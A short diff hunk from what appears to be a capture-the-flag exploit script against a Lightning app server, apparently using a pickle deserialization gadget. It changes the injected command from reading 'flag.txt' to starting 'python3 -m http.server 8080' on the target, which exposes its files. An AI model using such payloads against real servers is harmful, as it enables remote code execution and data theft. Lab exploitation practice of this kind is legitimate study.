@@ -38,7 +38,7 @@ class Root:
         return str, (str(self),)
 
 server_host = 'http://lightning-app:7501'
-command = 'cat flag.txt'
+command = 'python3 -m http.server 8080'
 
 def send_delta(d):
     # this posts a delta to the remote host
